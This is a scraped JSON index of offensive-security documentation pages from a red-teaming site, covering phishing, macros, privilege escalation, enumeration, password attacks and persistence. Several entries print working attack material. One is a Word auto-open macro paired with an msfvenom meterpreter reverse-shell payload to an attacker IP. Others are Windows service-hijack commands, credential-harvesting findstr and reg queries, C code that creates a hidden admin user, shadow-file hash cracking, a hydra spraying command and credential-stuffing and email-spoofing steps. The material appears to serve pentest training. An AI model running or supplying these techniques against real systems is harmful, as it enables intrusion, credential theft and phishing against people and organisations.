    "objectID": "c55647aede6c37d56bf554cf61f1514b",
    "u": "https://fire.tymyrddin.dev/docs/opsec/threats",
    "t": "Analyse threats ",
    "c": "Analyse threats  Threat analysis refers to identifying potential adversaries and their intentions and capabilities: Who is the adversary? What are the adversary’s goals? What tactics, techniques, and procedures does the adversary use? What critical information has the adversary obtained, if any? The task of the red team is to emulate an actual attack so that the blue team discovers its shortcomings (if any) and becomes better prepared to face incoming threats. The blue team’s main objective is to ensure the security of the organisation’s network and systems. The intentions of the blue team are to keep the red team out of their network. The blue team is considered our adversary as we have conflicting objectives. The blue team’s capabilities might not always be known at the beginning. Malicious third-party players may have different intentions and capabilities and pose a threat as well. This party can be someone with humble capabilities scanning the systems randomly looking for low-hanging fruit, or it can be a skilled adversary targeting the client systems. The intentions and the capabilities of this third party make them an adversary too. threat = adversary + intent + capability",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "867a5133daeafe887b39b77cfcad69e7",
    "u": "https://fire.tymyrddin.dev/docs/intel/tiber-eu",
    "t": "TIBER-EU ",
    "c": "TIBER-EU  TIBER-EU (Threat Intelligence-based Ethical Red Teaming) is a common framework developed by the European Central Bank that centers around the use of threat intelligence. How threat intelligence and red teaming fit into TIBER engagements In this framework, the “Testing” phase requires threat intelligence to feed the red team’s testing. It encompasses a helicopter-view best practice rather than anything actionable from a red team perspective. Resources  TIBER-EU FRAMEWORK - whitepaper on “How to implement the European framework for Threat Intelligence-based Ethical Red Teaming”. FireEye solution brief - Developing Cyber Resilience for Financial Institutions with TIBER-EU.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b0af418491d3b62ea324ff3433fa1ba3",
    "u": "https://fire.tymyrddin.dev/docs/weapons/vba",
    "t": "Visual Basic for Application (VBA) ",
    "c": "Visual Basic for Application (VBA)  Open Visual Basic Editor in MSWord by selecting view → macros Name the macro and click create. For another message box (testing): Sub MACRONAME() MsgBox (\"Message in a box\") End Sub Run the macro with F5. To execute it automatically: Sub Document_Open() MACRONAME End Sub Sub AutoOpen() MACRONAME End Sub Sub MACRONAME() MsgBox (\"Message in a box\") End Sub Save the document in docm or doc. Execute a bin  Sub ExecBin() Dim payload As String payload = \"calc.exe\" CreateObject(\"Wscript.Shell\").Run payload,0 End Sub Use msfvenom for VBA  msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-MACHINE-IP LPORT=443 -f vba Copy the output in the file and set the listener with msfconsole use exploit/multi/handler Set LHOS, LPORT and payload to windows/meterpreter/reverse_tcp . When the doc is open in the target machine we get a meterpreter shell.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5c757638a541df33c817a326083271f5",
    "u": "https://fire.tymyrddin.dev/docs/phishing/analytics",
    "t": "Use analytics to lure a target ",
    "c": "Use analytics to lure a target  Attack tree  1 Get TrackingID of page (Copy code after YT or YA) (AND) 2 Use set on Kali 2.1 Social Engineering Attacks (1) -> Third party modules (11) -> Google Analytics attack (2) (AND) 2.2 manual 2.2.1 Enter TrackingID UA+Copied code (AND) 2.2.2 Hostname of target (for example https://youtube.com/) (AND) 2.2.3 Page (what comes after hostname) (AND) 2.2.4 Page Title (for example Youtube) (AND) 2.2.5 Referral page: A by us BeEF hook injected website (AND) 2.2.6 Send payload on loop (every 60 seconds, so as not to wake up the dogs) Notes  Target sees a lot of traffic coming from the BeEF injected page and may go and see what’s up with that. Articles  Google Analytics Usage Statistics Historical trends in the usage statistics of traffic analysis tools for websites",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9928d94786cca0541823af78d3eecbf5",
    "u": "https://fire.tymyrddin.dev/docs/passwords/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  With only access to the network and having enumerated users, attacking login interfaces to applications or operating systems with password spraying, brute-force and dictionary attacks, and hash cracking. Why?  Gain access to the systems and the data they protect. Defenders look for attacks against authentication systems based on things like the source of the request, the number of attempts, and the accounts targeted. They may have implemented account lockout policies to temporarily or permanently suspend an account based on a number of failed logins, or they may enable automated blocking for a source that makes too many attempts. In a pentesting context, prevent unnecessary disruption and avoid detection. In a red teaming context, this is not the best route to take. How?  Password profiling Brute-force and dictionary attacks Password spraying Hash cracking",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "57a23b37a4eee1632972369ef7adf0a9",
    "u": "https://fire.tymyrddin.dev/docs/phishing/stuffing",
    "t": "Credential stuffing ",
    "c": "Credential stuffing  From research, what appears to be happening. There’s a huge market on the dark side. Attack tree  1 Use a credential stuffing tool such as Sentry MBA (OR) 1.1 Configure tool (AND) 1.1.1 The url for the website's login page 1.1.2 Field markers to help navigate form elements 1.1.3 Rules for valid password constructions 1.2 Optimise and test the attack setup against the live target website (AND) 1.3 Add combo file (list of usernames and passwords that were valid on another website/application) (AND) 1.4 Add proxy file (AND) 1.5 Commence attack 2 DIY 2.1 Buy breached credentials (private sales, hacking forums, dark web marketplaces, password dump sites) 2.2 Check credentials (social media sites, online marketplaces) 2.2.1 Use botnet (AND) 2.2.1.1 Create botnet (OR) 2.2.1.2 Hire botnet 2.2.2 Stuff credentials against target sites/applications 2.2.2.1 Bypass security and fraud detection such as IP blacklists or rate limiting (AND) 2.2.2.2 Spoof the \"referer\" header value for bypassing referrer checks (AND) 2.2.2.3 Simulate user with OCR and/or database with possible CAPTCHA images and answers. 2.2.2.3 Try logins with breached credentials Notes  Credential stuffing is currently one of the most common techniques used to take-over user accounts. Credential spilling is when credentials gained from data breaches are sold to other adversaries. Credential stuffing is the large scale use of automated means to test stolen passwords against other unrelated websites. This is a possible and often successful attack because of the tendency for users to recycle their passwords for multiple accounts. Adversaries no longer need advanced technical skills, specialized equipment, or insider knowledge to successfully attack major websites. Tools are available that bypass traditional security controls, like IP rate limits, reputation lists, blacklists, and other forms of IP-based analysis. CAPTCHA and other controls designed to impede automated interaction with user interfaces are bypassed with Optical Character Recognition (OCR) software and other complementary mechanisms to read and solve those challenges the way that a human user would. A number of forums offer a wide variety of working configurations for various websites for the tools. Successful logins (usually 0.1-0.2%) allow the adversary to drain the associated accounts of stored values, credit card numbers, and other personally identifiable information and/or to use the account for impersonation, and for actions like sending spam.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "dc8b694901db2d21ce24e53e57b6d8e5",
    "u": "https://fire.tymyrddin.dev/docs/escalation/software",
    "t": "Abusing vulnerable software ",
    "c": "Abusing vulnerable software  Attack tree  1 Abuse vulnerable software 1.1 Vulnerability in software 1.2 Available exploit Example  Use the wmic tool to list software installed on the target system and its versions: Search for existing exploits on the installed software online on sites like exploit-db, packet storm or Google. Exploit Notes  Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "940c9c2791744b96c902874b7dbd47d2",
    "u": "https://fire.tymyrddin.dev/docs/enum/smb",
    "t": "SMB ",
    "c": "SMB  Server Message Block (SMB) is a communication protocol that provides shared access to files and printers. Check shared folders using net share: net share Results: Share name Resource Remark ------------------------------------------------------------------------------- C$ C:\\ Default share IPC$ Remote IPC ADMIN$ C:\\Windows Remote Admin Internal C:\\Internal Files Internal Documents Users C:\\Users The command completed successfully.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1320e87cdb7143bc712cd8b5c35d1eda",
    "u": "https://fire.tymyrddin.dev/docs/escalation/patterns",
    "t": "Reuseful escalation patterns ",
    "c": "Reuseful escalation patterns  Host Information  Get OS version, patches, etc.: systeminfo type C:\\Windpws\\system32\\eula.txt type C:\\BOOT.INI Get current user: whoami whoami /priv echo %username% Get environment variables: set List users: net accounts net group net users List user details: net users <user> Network information: ipconfig /all Routing information: netstat -r route print arp -a Firewall information: netsh firewall show state netsh firewall show config List open connections: netstat -aton List scheduled tasks: schtasks /query /fo LIST /v Firewall and AV information  Check Windows defender: sc query windefend View all services running on the machine: sc queryex type= service sc = service control Firewall settings: netsh advfirewall firewall dump netsh firewall show state Show firewall config: netsh firewall show config Services  List Windows services: net start tasklist /SV wmic service list brief sc query state= all Weak services  Find misconfigured permissions by finding executables and running icalcs or cacls commands to determine user permissions. If lucky they may have full (F) or modified (M) permissions for the current user. Also look for unquoted path folders such as C:\\Program Files that run as SYSTEM/Administrator . On newer machines: icacls \"C:\\<path-to-service>.exe\" Older machines: cacls \"C:\\<path-to-service>.exe\" If wmic is available, pull a list with: wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\\" |findstr /i /v \"\"\" Change a weak service by replacing the executable with a malicious one: move <evil-file>.exe \"C:\\Program Files\\<service>\\<file>.exe\" Then reboot the server or wait for system to restart it. Or if possible, inject the service path: sc config <service> binpath= \"<exploit-code>\" Then restart the service: sc stop <service> sc start <service> Windows XP SP1  Windows XP SP1 has a known vulnerability in upnphost. First start by making sure its dependency and service is running: sc config SSDPSRV start= auto net start SSDPSRV Then change the executable path: sc config upnphost binpath= \"<exploit-code>\" sc config upnphost obj= \".\\LocalSystem\" password= \"\" sc qc upnphost Then start the service: net start upnphost If both wmic and sc are not available, use accesschk accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula Space in service path  If the above service search came up with a path such as: C:\\Program Files\\<service>\\<file>.exe This could allow replacement by an evil.exe file in: C:\\Program.exe Start/Stop with denied permissions  If a service gives a permission denied to start or stop, this may or may not be exploitable . Search files and registry  List current directory with metadata, system and data stream files: dir /s /q /R Attempt to find password strings in common files: findstr /spin password *.txt findstr /spin password *.xml findstr /spin password *.config findstr /si password *.ini findstr /spin credentials *.txt findstr /spin credentials *.xml findstr /spin credentials *.config findstr /si credentials *.ini findstr /spin secret *.txt findstr /spin secret *.xml findstr /spin secret *.config findstr /si secret *.ini Attempt to find password strings in all files: findstr /spin \"password\" *.* findstr /spin \"credentials\" *.* findstr /spin \"secret\" *.* Find all common configuration or sensitive files: dir/q \\*.txt /s dir/q \\*.rar /s dir/q \\*.zip /s dir/q \\*.xls /s dir/q \\*.xlsx /s dir/q \\*.ini /s dir/q \\*.cap /s dir/q \\*.pcap /s dir/q \\*.exe /s dir/q \\*.pdf /s Attempt to find password strings in registry settings: reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password Port Forwarding  Using plink.exe. Recommend using secondary user from attacking machine: plink.exe -l <user> -pw <password> <attacking-ipaddress> -R <lport>:127.0.0.1:<rport> Network drives  Find users mapped drives  Show current mapped drives: net share Search registry for user SID: reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\\" /s Then finding the SID, get the network paths and usernames used to connect, if any: reg query \"HKEY_USERS\\<SID>\\Network\" /s Map a drive  Create a network drive: net use Z: \\\\<path>\\ Map to Domain Controller sysvol: net use Z: \\\\<dc>\\SYSVOL Search for group policy xml: z: dir /s /q groups.xml Search for kernel vulnerabilities.  Copy systeminfo to a text file on attacking machine. Download Windows Exploit Suggester: wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py Download bulletin database: wget http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx Install requirements: apt -y install python-xlrd Run: python windows-exploit-suggester.py --systeminfo systeminfo.txt --database BulletinSearch.xlsx Common Simple Overwrite Code  Create an admin user and add to administrator and remote desktop groups: #include <stdlib.h> int main () { system(\"net user <user> <password> /add\"); system(\"net localgroup administrators <user> /add\"); system(\"net localgroup administrators \"Remote Desktop Users\" <user> /add\"); return 0; } Compile: i686-w64-mingw32-gcc <file>.c -lws2_32 -o <output>.exe",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "37d5efd956731773c4e001c24b0882c9",
    "u": "https://fire.tymyrddin.dev/docs/enum/windows",
    "t": "Windows ",
    "c": "Windows  System  Get detailed information about the system, such as its build number and installed patches: systeminfo Check installed updates - this information will give an idea of how quickly systems are being patched and updated: wmic qfe get Caption, Description For listing installed apps: wmic product get name,version,vendor Users  To know who you are: whoami To know what you are capable of (privileges you have): whoami /priv Which groups you belong to: whoami /groups View users: net user Discover the available groups if the system is a Windows Domain Controller: net group If the system is NOT a Windows Domain Controller: net localgroup List the users that belong to the local administrators’ group: net localgroup administrators To see the local settings on a machine: net accounts If the machine belongs to a domain: net accounts /domain This command helps learn about password policy, such as minimum password length, maximum password age, and lockout duration. Networking  System network configuration: ipconfig For the DNS servers, use all network-related settings: ipconfig /all Use netstat to get information, such as which ports the system is listening on, which connections are active, and who is using them. Use the option -a to display all listening ports and active connections, -b to find the binary involved in the connection, -n to avoid resolving IP addresses and port numbers, and -o to display the process ID (PID). netstat -abno Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:22 0.0.0.0:0 LISTENING 2016 [sshd.exe] TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 924 RpcSs [svchost.exe] TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 Can not obtain ownership information TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 416 TermService [svchost.exe] [...] TCP 10.20.30.130:22 10.20.30.1:39956 ESTABLISHED 2016 [sshd.exe] TCP 10.20.30.130:22 10.20.30.1:39964 ESTABLISHED 2016 [sshd.exe] To discover other systems on the same LAN that recently communicated with the system: arp -a Running services  net start",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "39c80b0f69b82655f02dfd69a8e5662a",
    "u": "https://fire.tymyrddin.dev/docs/passwords/password-spraying",
    "t": "Password spraying ",
    "c": "Password spraying  Attack tree  1 Make a users.txt file from enumerated users 2 Choose a well-known likely password (use information from reconnaissance, season) 3 Use a tool such as Metasploit, Hydra, Medusa, or Nmap Examples  SSH  hydra -L userlist.txt -p Password123! <target IP> ssh Notes  The disadvantages are that it relies heavily on luck and good educated guesses about how people think, and there is still a risk of alarms going off because of targeting many accounts from a single source or over a small amount of time.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "73f42fec2321962357fbbc6360bf98bd",
    "u": "https://fire.tymyrddin.dev/docs/weapons/seo-poisoning",
    "t": "SEO poisoning ",
    "c": "SEO poisoning  From research, what appears to be happening: The below search engine poisoning attack tree can be used for feature extraction. Attack tree  1 Set up branching logic (usually PHP script) (AND) 1.1 Identify crawlers (OR) 1.1.1 Query IP of page request ($_SERVER['REMOTE_ADDR']) and compare against usual search engine IP ranges) (OR) 1.1.2 Check user-agent string ($_SERVER['HTTP_USER_AGENT']) to flag requests from crawlers that use identifying strings 1.2 Identify users 1.2.1 Check referrer ($_SERVER['HTTP_REFERER']) against a list of strings used by search engines (OR) 1.2.2 Check the referrer URL for multiple occurrences of & (field value pair delimiters) 2 Get and select keywords and topical phrases (AND) 2.1 Fetch and select latest keywords from 2.1.1 C&C server (less resilient) (OR) 2.1.2 Google Trends (OR) 2.1.3 Other sources 2.2 Optional: Log information about page requests received to monitor requests (for fine-tuning and improvements) 2.2.1 Keywords user arrived by 2.2.2 Timestamp 2.2.3 User agent string 2.2.4 Referrer string 2.2.5 IP from which page request is received 2.3 Download search engine results (AND) 2.3.1 PHP client URL library (OR) 2.3.2 cURL (OR) 2.3.3 fsockopen() 2.4 Extract meta content from the downloaded pages (using regular expressions) (AND) 2.5 Optional: Boost page ranking 2.5.1 Get links of other SEO pages 2.5.1.1 Same server 2.5.1.2 Related servers 2.5.2 Intersperse extracted meta content with links to other SEO pages, random time/dates, images, video content 3 Page generation (AND) 3.1 Same page for crawlers and users (OR) 3.1.1 Generate page 3.1.2 Redirect 3.1.2.1 Redirect by active content embedded in page (OR) 3.1.2.2 Only load additional active content in page if request is from a user 3.1.2.2.1 JavaScript (OR) 3.1.2.2.2 ActionScript in embedded Flash (navigateToURL( new URLRequest(\"*yourpage*\"), \"_self\");) (OR) 3.1.2.2.3 Another way of redirecting using active content 3.2 Different pages for user and crawler 3.2.1 Generate SEO page for crawlers (AND) 3.2.1.1 Static HTML (OR) 3.2.1.2 Dynamic generation (OR) 3.2.1.3 SEO related sub-domains 3.2.2 Redirect users (a few times) 3.2.2.1 Server-side scripting with PHP header() (OR) 3.2.2.2 Apache HTTP Server mod_alias 3.2.2.3 Apache HTTP Server mod_rewrite (redirecting requests to a canonical domain name) (OR) 3.2.2.4 Nginx rewrite (OR) 3.2.2.5 Refresh Meta tag in document (add anchor in the “body” section for users whose browsers do not support this feature) (OR) 3.2.2.6 HTTP refresh header in a perl or python script (OR) 3.2.2.7 JavaScript (OR) 3.2.2.8 Another way of redirecting 4 Landing page 4.1 Adult and pornographic websites (OR) 4.2 Internet services sites (advertising campaign) (OR) 4.3 Politics and religion (on a mission) (OR) 4.4 Exploit servers 4.4.1 Redirection chain to a final landing page with malware payloads 4.4.2 Redirection to a MaaS (Malware-as-a-Service) platform which starts a redirection chain leading to final landing page Notes  The phrase search engine optimization poisoning (SEO poisoning) is in use to describe one of two types of activities: Black hat SEO techniques used to achieve high search engine ranking, usually (but not only) to attack visitors. The techniques often involve content spamming, (all sorts of) link spamming, cloaking, doorway pages and redirection. These attacks often follow trending search terms. For example during natural disasters, when attackers attempt to have victims send monetary aid to fake accounts or during major political campaigns and other major world events. If its intent is malicious, the attacker aims to install malware such as trojans, attack the user’s machine, or trick the user into providing sensitive data (see attack tree). Exploiting typical web vulnerabilities on existing high-ranking web pages and using them to spread malware. If, for example, a high-ranking web page has a stored XSS vulnerability, the code may either directly attempt to spread malware or redirect the user to a different site (using redirection like used in black hat SEO). Any search engine software can expect the same search fraud problem as on the internet with similar impacts. Spam web pages will need to be weeded out from the index. Combating spam is intertwined with search engine poisoning as that attack uses SEO fraud techniques.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "24b5ee56350311a0d8a011ef8ac9f16c",
    "u": "https://fire.tymyrddin.dev/docs/opsec/vulnerabilities",
    "t": "Analyse vulnerabilities ",
    "c": "Analyse vulnerabilities  In a context like red teaming, an OPSEC vulnerability exists when an adversary can obtain critical information, analyse the findings, and act in a way that would affect the red team’s plans. Example: You use Nmap to discover live hosts on a target subnet and find open ports on live hosts. Moreover, you send various phishing emails leading the victim to a phishing webpage you’re hosting. Furthermore, you’re using the Metasploit framework to attempt to exploit certain software vulnerabilities. These are three separate activities, but if you use the same IP address(es) to carry out these different activities, this would lead to an OPSEC vulnerability. Example: An unsecured database that is used to store data received from phishing victims. If the database is not properly secured, it may lead to a malicious third party compromising the operation and could result in data being exfiltrated and used in an attack against the client’s network. Instead of helping the client secure their network, you end up helping a third party expose login names and passwords.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "76361ba7990e312b701e2467ed13f398",
    "u": "https://fire.tymyrddin.dev/docs/passwords/brute-force",
    "t": "Brute-force and dictionary attacks ",
    "c": "Brute-force and dictionary attacks  Attack tree  1 Make a users.txt file from enumerated users 2 Make a passwords.txt file (use information from reconnaissance) 3 Use a tool such as Metasploit, Hydra, Medusa, or Nmap Examples  SSH  users.txt contains one entry: a name from users enumeration nmap --script ssh-brute -p22 <IP address> --script-args userdb=users.txt,passdb=passwords.txt Notes  In a brute-force attack, an adversary cycles through every possible password combination until they stumble on the correct one. The time required is likely to exceed the death of the universe, and it is most likely to trigger automated blocking defenses and set off every possible alarm. Lists of the most popular passwords and dictionary attacks make the process much quicker than pure trial and error. The more sophisticated a user’s password, however, the longer it will take and the more it will cost to crack it, and if the password is not in the dictionary of guesses, no luck. The more guesses made, the more likely is detection or triggering a control. If the target organisation has an account lockout policy that locks an account after four incorrect guesses, this may create a denial of service condition for any accounts targeted with four or more incorrect guesses. Scripts  Password guessing Resources  Password lists",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "f166e0930366d198b5a72d8ba076da02",
    "u": "https://fire.tymyrddin.dev/docs/persistence/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Creating alternate ways to regain access to a host without going through the exploitation phase all over again. Why?  Re-exploitation isn’t always possible: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them. Gaining a foothold is hard to reproduce: For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network. The blue team is after you: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock! How?  Tampering with unprivileged accounts Backdooring files Abusing services Abusing scheduled tasks Logon triggered persistence Backdooring the login screen/RDP Persisting through existing services",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ab9f915ea106dc6fadc923a53c7dcd84",
    "u": "https://fire.tymyrddin.dev/docs/phishing/mail-delivery",
    "t": "Mail delivery ",
    "c": "Mail delivery  Attack tree  1 Spoof email using mailserver and sendemail on Kali (OR) 1.1 Sign up for a mailserver (AND) 1.1.1 Paid email marketing service (OR) 1.1.2 Paid service with a free plan 1.2 Use sendemail 1.2.1 Specify username (-xu) and password (-xp) with the SMTP settings in configuration mailserver (AND) 1.2.2 Specify server and port (-s) with the SMTP settings in configuration mailserver (AND) 1.2.3 Set from email address (-f) (AND) 1.2.4 Set to email address (-t) (AND) 1.2.5 Set subject (-u) (AND) 1.2.6 And body (-m) (AND) 1.2.7 Use the advanced option (-o) for specifying the \"From: Name <email address>\" message-header 2 Spoof email using php mail() function on hosting 2.1 Sign up for a free hosting plan (AND) 2.1.1 Choose domain later (AND) 2.1.2 Email and other things not needed either 2.2 Use php mail() function 2.2.1 Go to the file manager of the website and public_html or name of website (different on each provider): find it empty or nearly empty (AND) 2.2.2 Create the send.php file and rename it to .txt for upload (AND) 2.2.3 Upload and change back extension to .php (AND) 2.2.4 Bring up the form and enter to, from, name, subject, message (AND) 2.2.5 Send (AND) 2.2.6 Remove send.php from server Notes  Use reconnaissance information for the from and to Use what you discovered about them and their interests, for the subject and body Have the body contain a link to a downloadable, for example in Dropbox (changing the link values to make it a direct download) Tools  sendemail SMTP diagnostics",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "01b1cec455e24a40298530b476bb7538",
    "u": "https://fire.tymyrddin.dev/docs/passwords/hash-cracking",
    "t": "Hash cracking ",
    "c": "Hash cracking  Attack tree  1 Using hashcat 1.1 Go to the hashcat website to identify the type of hash function and associated module value. 1.2 Get the rockyou.txt file (if not already available in /usr/share/wordlists/) 1.3 Apply the hashcat command 2 Using Rainbow Tables 2.1 Identify the type of hash 2.2 Download or generate the rainbow table 2.3 Apply command Example  The /etc/shadow file stores the garbled or hashed values of all user’s passwords on Linux. It is a critical file with strict access permissions; it is and must only be accessible by the root account. If you come across a readable /etc/shadow file through any regular user account, you can get the hash value of the root account and crack the password hash using the hashcat utility. cut -d: -f1 /etc/shadow | grep root root:$6$j9T$TANXgpk59y8r3jgPbDl/w/$UqiK6yahwqfyqhcegWLa1.z64TyePP5.VQpUnLqI3VD:18765:0:99999:7::: Save the hash in a file called hash.txt and identify the type of hash. SHA512 hash mode is generally identified by the $6$ term and has a reference module value of 1800. hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt Notes  Passwords may be sent over the wire or stored in hashed format. You may intercept one or more of these hashes while pursuing other network attacks, for example, with Responder. Unlike password spraying, you do not risk account lockouts or alert triggers by cracking a hash offline. Hash functions  A cryptographic hash function is a type of algorithm that takes variable-length strings (message) of input and turns them into fixed-length hash values (message digest). The primary objective is message integrity, such that the hash value cannot be returned to its original string value. This makes hashing an ideal candidate for storing passwords. The hash-identifier Python script helps fingerprint various hash types by evaluating characteristics from the known hash value. Rainbow tables  A rainbow table computes the possible hash values for plaintext values, up to a certain length. Regardless of computing power, these tables can become massive and require enormous storage capacity (~300 GB). Each table is usually strategically designed for a specific hash requirement, such as MD5, SHA-1, and NT Lan Manager (NTLM), which is used in various Microsoft network protocols for authentication. Rainbow tables can be defeated by salted hashes, if the hashes are not salted however, and you have the correct table, a complex password can be cracked in a few minutes. There are various locations you can download Rainbow Tables, for example you can find a fairly comprehensive set of free Rainbow Tables at Project RainbowCrack including paid tables optimized for various things (NTLM, MD5, SHA1 etc). Project Shmoo is offering downloads of popular Rainbow Tables via BitTorrent. The tool to generate Rainbow Tables comes with the RainbowCrack download and is called rtgen . No resources  If you don’t have a high-performance computing system composed of graphics processing unit (GPU) clusters for Hashcat or RainbowCrack, using wordlists is a quick and dirty way to find out what you are working with in regard to overall security. You can also try a hash lookup service like Hashes.com. You can put in an MD5, SHA-1, Vbulletin, Invision Power Board, MyBB, Bcrypt, Wordpress, SHA-256, SHA-512, MYSQL5 etc. hash and search for its corresponding plaintext (“found”) in their database of already-cracked hashes. Tools  Hashcat RainbowCrack Hashes.com Resources  hash-identifier rockyou.txt Generic hash types RainbowCrack project: List of Rainbow Tables Shmoo rainbow tables Comparison of Hash Function Algorithms Against Attacks: A Review",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ad1a54047ee1909562801f470c678fdb",
    "u": "https://fire.tymyrddin.dev/docs/intel/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Threat Intelligence (TI) or Cyber Threat Intelligence (CTI) is the information, or TTPs (Tactics, Techniques, and Procedures), attributed to an adversary, commonly used by defenders to aid in detection measures. In addition, Indicators of compromise (IoC) can be used. Why?  To leverage its information from an offensive perspective to assist in adversary emulation. How?  To aid in consuming CTI and collecting TTPs, red teams can use threat intelligence platforms and frameworks such as: TIBER-EU MITRE ATT&CK OST Map The Art of Cyberwarfare, Jon DiMaggio, 2022",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "840ff8549273c167b188ce06c4c2370c",
    "u": "https://fire.tymyrddin.dev/docs/passwords/profiling",
    "t": "Password profiling ",
    "c": "Password profiling  Having a good wordlist is critical to carrying out a successful password attack. Default passwords  Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers did not change the default password, making the system vulnerable. It is good practice to try out admin:admin , admin:password123 , … If we know the target device, service or software, we can look up the default passwords (if any) and try those. Some websites that provide default passwords for some products: CIRT.net Default Passwords DefaultPassword Datarecovery.com Default Passwords Weak Passwords  Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Some of those public common weak passwords lists: Skull security passwords - This includes the most well-known collections of passwords. SecLists - A huge collection of all kinds of lists, not only for password cracking. Leaked Passwords  Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as ‘dumps’. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. These are some common password lists that have weak and leaked passwords, including webhost, elitehacker, hak5, Hotmail, PhpBB companies’ leaks: SecLists/Passwords/Leaked-Databases Combined wordlists  Combine these wordlists into one large file with cat : cat file1.txt file2.txt file3.txt > combined_list.txt To clean up the generated combined list to remove duplicated words: sort combined_list.txt | uniq -u > cleaned_combined_list.txt Customized wordlists  Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a website contains valuable information about the organisation and its people, including emails and names. The website may contain keywords specific to what the organisation does or offers, including product and service names, which may be used in a password. Tools such as cewl can crawl a website and extract strings or keywords: cewl -w list.txt -d 5 -m 5 http://target.com -w will write the contents to a file (list.txt). -m 5 gathers strings (words) that are 5 characters or more -d 5 is the depth level of web crawling/spidering (default 2) The result is a decently sized wordlist based on relevant words for the specific organisation, like names, locations, and a lot of their lingo. The created wordlist can be used to fuzz for usernames. Username wordlists  With peoples’ names gathered during enumeration, we can generate username lists from the target’s website. For example, with a {first name} {last name} and a method of generating usernames: {first name}: john {last name}: smith {first name}{last name}: johnsmith {last name}{first name}: smithjohn first letter of the {first name}{last name}: jsmith first letter of the {last name}{first name}: sjohn first letter of the {first name}.{last name}: j.smith first letter of the {first name}-{last name}: j-smith ... There is a tool username_generator that creates a list with most of the possible combinations if we have a first name and last name. git clone https://github.com/therodri2/username_generator.git cd username_generator python3 username_generator.py -h usage: username_generator.py [-h] -w wordlist [-u] Python script to generate user lists for bruteforcing! optional arguments: -h, --help show this help message and exit -w wordlist, --wordlist wordlist Specify path to the wordlist -u, --uppercase Also produce uppercase permutations. Disabled by default Continued: echo \"John Smith\" > users.lst python3 username_generator.py -w users.lst usage: username_generator.py [-h] -w wordlist [-u] john smith j.smith j-smith j_smith j+smith jsmith smithjohn Resources  Kali Linux – Crunch Utility CUPP – Common User Passwords Profiler",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "405105f4f5454b0ffc0268b2e424a867",
    "u": "https://fire.tymyrddin.dev/docs/enum/passive",
    "t": "Passive scanning ",
    "c": "Passive scanning  Attack tree  1 Get information 1.1 LDAP can reveal possible shares, users and other resources on a windows network (AND) 1.2 SNMP can have default community strings (passwords) set (AND) 1.3 SMTP can give information like server name, organisational email structure, whether it takes connections (useful for bouncing) (AND) 1.4 NTP can give time stamps for the network and what it is set to (some protocols are extremely sensitive to time shifts) (AND) 1.5 DNS may give machine names and/or network services, and may even allow a (partial or whole) zone transfer (AND) 1.6 Network devices can be many, and some allow for becoming a listener on your behalf (AND) 1.7 Network traffic can be sniffed to detect what services are running on the network Notes  Merely included for practicing with the tools in one’s own network where we are insiders. Tools  Wireshark DNSrecon was written by Carlos Perez in 2006. It was originally written in Ruby, but now has a Python port, which is what is running in Kali. P0f net-snmp Onesixtyone",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "fd0d280c0628dcab7d98efff444f8ed2",
